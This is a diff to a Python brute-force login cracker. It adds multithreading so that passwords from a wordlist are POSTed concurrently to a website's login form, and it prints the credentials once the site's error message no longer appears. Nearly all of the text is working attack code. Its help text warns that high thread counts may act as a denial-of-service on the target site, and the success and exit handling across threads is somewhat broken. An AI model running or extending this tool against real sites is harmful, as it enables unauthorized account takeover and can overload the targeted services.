@@ -37,6 +37,7 @@ else:
     parser.add_argument("error", type=str, help="Website error message when password is wrong")
     parser.add_argument("--login-field", type=str, help="Login field name from POST request on website")
     parser.add_argument("--password-field", type=str, help="Password field name from POST request on website")
+    parser.add_argument("--threads", type=int, help="Number of threads to run (recommended 1-5, to high value may trigger DOS attack attempt on website)")
     args = vars(parser.parse_args())
     
     INTERACTIVE = False
@@ -49,6 +50,11 @@ if INTERACTIVE:
     args['error'] = input("Enter Wrong Password Error Message: ")
     args['login_field'] = input("Enter login field name (in POST request) [def: login]: ")
     args['password_field'] = input("Enter password field name (in POST request) [def: password]: ")
+    args['threads'] = input("How many threads to run (recommended 1-5, to high value may trigger DOS attack attempt on website): ")
+    if not args['threads'].isnumeric():
+        print("This value should be a number!")
+        exit()
+    args['threads'] = int(args['threads'])
 
 
 args['login_field'] = "login" if not args['login_field'] else args['login_field']
@@ -60,25 +66,48 @@ for c in LOADING_BANNER:
     sys.stdout.flush()
     time.sleep(0.02)
 
+COUNT = 0
+
+class Checker:
+    def __init__(self, username, url, error):
+        self.username = username
+        self.url = url
+        self.error = error
+        self.count = 0
+        self.found = ""
+
+    def check_password(self, password):
+        self.count += 1
+        print(f"{self.found} [{args['threads']}th] Trying Password: {str(self.count)} Time For => {password}")
+        data_dict = {args['login_field']: self.username, args['password_field']: password, "Log In":"submit"}
+        response = requests.post(self.url, data=data_dict)
+        if self.error in str(response.content):
+            pass
+        elif "csrf" in str(response.content).lower():
+            self.found = "csrf"
+        else:
+            self.found = password
+            exit()
+
+
 try: 
     def bruteCracking(username,url,error):
-        count = 0
-        for password in passwords:
-            password = password.strip()
-            count = count + 1
-            print("Trying Password: "+ str(count) + ' Time For => ' + password)
-            data_dict = {args['login_field']: username,args['password_field']: password, "Log In":"submit"}
-            response = requests.post(url, data=data_dict)
-            if error in str(response.content):
-                pass
-            elif "csrf" in str(response.content).lower():
-                print(str(response.content))
-                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
-                exit()
-            else:
-                print("Username: ---> " + username)
-                print("Password: ---> " + password)
-                exit()
+        checker = Checker(username, url, error)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=int(args['threads'])) as executor:
+            for password in passwords:
+                if checker.found != "":
+                    executor.shutdown()
+                    break
+                password = password.strip()
+                executor.submit(checker.check_password, password)
+        if checker.found == "csrf":
+            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
+            exit()
+        else:
+            time.sleep(1)
+            print("Username: ---> " + username)
+            print("Password: ---> " + checker.found)
+            exit()
 except:
     print("Some Error Occurred Please Check Your Internet Connection !!")
 
